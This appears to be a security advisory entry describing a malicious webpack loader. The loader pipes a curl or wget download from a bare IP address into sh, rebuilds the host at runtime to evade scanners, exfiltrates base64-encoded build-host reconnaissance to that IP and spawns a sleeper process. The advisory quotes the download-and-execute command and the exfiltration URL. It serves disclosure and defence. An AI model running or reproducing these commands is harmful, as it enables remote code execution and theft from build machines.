summary: Webpack loader fetches and executes remote shell payload from bare-IP host and exfiltrates build-host reconnaissance
details: dist/bsrc-loader.js, reachable through the package's declared widget entry as a webpack inline-loader, on Linux spawns /bin/sh -c to run `curl -fsSL -m180 http://49.232.169.67:80/slt || wget...` and pipes the response to sh, executing attacker-controlled shell code on the build machine. The destination host is reconstructed at runtime from the array ['49','232','169','67'].join('.') to evade static scanners. The same loader collects reconnaissance about the build environment — external IP via cip.cc, an internal Baidu SSRF probe response from http://bsrc-ssrf.n.baidu-int.com, process.cwd(), target root path, PIDs, and captured stderr/stdout of executed commands — base64-encodes the fields and GETs them to http://49.232.169.67:80/bsrc-r272?<fields>. The loader also spawns a detached ~9-day sleeper process to keep execution alive.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
